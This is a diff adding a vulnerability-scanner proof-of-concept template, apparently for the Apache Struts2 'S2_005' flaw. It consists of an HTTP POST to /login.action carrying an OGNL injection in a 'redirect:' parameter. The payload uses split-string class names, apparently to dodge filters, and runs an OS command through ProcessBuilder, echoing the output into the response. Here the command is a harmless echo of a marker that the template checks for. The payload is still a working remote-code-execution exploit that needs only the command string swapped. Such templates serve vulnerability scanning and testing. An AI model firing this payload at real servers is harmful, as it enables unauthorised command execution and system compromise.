@@ -1,0 +1,16 @@
+﻿<DudePoc_Name>S2_005</DudePoc_Name>
+<DudePoc_Description></DudePoc_Description>
+<DudePoc_SetHeader>
+POST /login.action HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+Content-type: application/x-www-form-urlencoded
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder('echo%2078468794903108696'.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>78468794903108696</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
